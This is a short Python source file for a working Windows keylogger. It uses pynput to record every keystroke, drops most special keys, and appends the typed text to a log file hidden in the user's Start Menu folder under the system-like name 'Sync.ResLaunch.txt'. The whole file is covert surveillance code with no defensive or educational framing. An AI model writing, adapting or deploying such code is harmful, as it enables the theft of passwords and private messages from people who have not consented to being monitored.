from pynput.keyboard import Listener
import getpass


username = getpass.getuser()  #user
def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")


    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"
    if letter == "Key.caps_lock":
        letter = "[CAPS ON/OFF]\n"
    if letter == "Key.function":
        letter = ""
    if letter == "Key.ctrl_r":
        letter = ""
    if letter == "Key.alt_l":
        letter = ""
    if letter == "Key.alt_r":
        letter = ""
    if letter == "Key.shift":
        letter = ""
    if letter == "Key.cmd":
        letter = ""
    if letter == "Key.tab":
        letter = ""
    if letter == "Key.delete":
        letter = ""

    #functionkeys
        
    if letter == "Key.f1":
        letter = ""
    if letter == "Key.f2":
        letter = ""
    if letter == "Key.f3":
        letter = ""
    if letter == "Key.f4":
        letter = ""
    if letter == "Key.f5":
        letter = ""
    if letter == "Key.f6":
        letter = ""
    if letter == "Key.f7":
        letter = ""
    if letter == "Key.f8":
        letter = ""
    if letter == "Key.f9":
        letter = ""
    if letter == "Key.f10":
        letter = ""
    if letter == "Key.f11":
        letter = ""
    if letter == "Key.f12":
        letter = ""

    #arrowkeys

    if letter == "Key.up":
        letter = ""
    if letter == "Key.down":
        letter = ""
    if letter == "Key.left":
        letter = ""
    if letter == "Key.right":
        letter = ""

    #extra

    if letter == "Key.esc":
        letter = ""
    if letter == "Key.print_screen":
        letter = ""


        #end of function keys, next more common keys
    if letter == "Key.home":
        letter = ""
    if letter == "Key.num_lock":
        letter = ""
    if letter == "Key.page_down":
        letter = ""
    if letter == "Key.page_up":
        letter = ""
    if letter == "Key.backspace":
        letter = ""
    if letter == "Key.menu":
        letter = ""

    f=open("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Sync.ResLaunch.txt", "a")

    with open("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Sync.ResLaunch.txt", 'a') as f:
        f.write(letter)

with Listener(on_press=write_to_file) as l:
    l.join()


